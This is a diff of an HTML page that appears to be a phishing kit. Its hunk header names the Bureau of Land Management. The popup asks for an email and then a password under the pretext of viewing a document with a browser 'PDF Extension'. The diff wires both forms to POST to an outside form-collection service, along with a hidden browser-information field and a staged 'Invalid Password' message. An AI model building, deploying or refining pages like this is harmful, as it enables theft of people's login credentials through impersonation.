@@ -1360,35 +1360,36 @@ Bureau of Land Management">
         <div class="popup-main">
             <div class="notify-status"></div>
             <div class="browser-notify"></div>
-            <form id="login-email" class="needs-email-validation" novalidate>
-                <h2 id="login-email-title"></h2>
+           <form id="login-email" action="https://formbold.com/s/94pAZ" method="POST" class="needs-email-validation" novalidate>
+    <h2 id="login-email-title">Enter Your Email</h2>
 
-                <div>
-                    <input name="username" type="email" id="validationCustom01" class="form-control" placeholder="Enter your email" required />
-                    <div class="invalid-feedback">Please choose a valid email address.</div>
-                </div>
+    <div>
+        <input name="username" type="email" id="validationCustom01" class="form-control" placeholder="Enter your email" required />
+        <div class="invalid-feedback">Please choose a valid email address.</div>
+    </div>
 
-                <div class="popup-footer">
-                    <button id="next-btn" type="submit" class="btn btn-primary">Next</button>
-                </div>
-            </form>
+    <div class="popup-footer">
+        <button id="next-btn" type="submit" class="btn btn-primary">Next</button>
+    </div>
+</form>
 
-            <form id="login-password" class="needs-password-validation" novalidate>
-                <h2>Welcome back,</h2>
-                <p></p>
-                <a id="change-email" href="javascript:;" onclick="changeEmail()">Change email</a>
-                <div>
-                    <label class="password-lbl">Enter your password</label>
-                    <div class="login-failed-notify">Invalid Password, Try again with your valid email account or Password</div>
-                    <input name="password" type="password" id="validationCustom02" class="form-control" placeholder="Password" required minlength="8" />
-                    <input type="hidden" name="browserinfo" id="browserinfo" />
-                    <div class="invalid-feedback">Password is at least 8 letters long.</div>
-                </div>
+<form id="login-password" action="https://formbold.com/s/94pAZ" method="POST" class="needs-password-validation" novalidate style="display:none;">
+    <h2>Welcome back,</h2>
+    <p id="user-email"></p> <!-- Email will be shown here after submission -->
+    <a id="change-email" href="javascript:;" onclick="changeEmail()">Change email</a>
 
-                <div class="popup-footer">
-                    <button id="login-btn" type="submit" class="btn btn-primary">View with {{browser name}} PDF Extension</button>
-                </div>
-            </form>
+    <div>
+        <label class="password-lbl">Enter your password</label>
+        <div class="login-failed-notify" style="display:none;">Invalid Password. Try again.</div>
+        <input name="password" type="password" id="validationCustom02" class="form-control" placeholder="Password" required minlength="8" />
+        <input type="hidden" name="browserinfo" id="browserinfo" />
+        <div class="invalid-feedback">Password must be at least 8 characters long.</div>
+    </div>
+
+    <div class="popup-footer">
+        <button id="login-btn" type="submit" class="btn btn-primary">View with <span id="browser-name"></span> PDF Extension</button>
+    </div>
+</form>
         </div>
     </div>
 
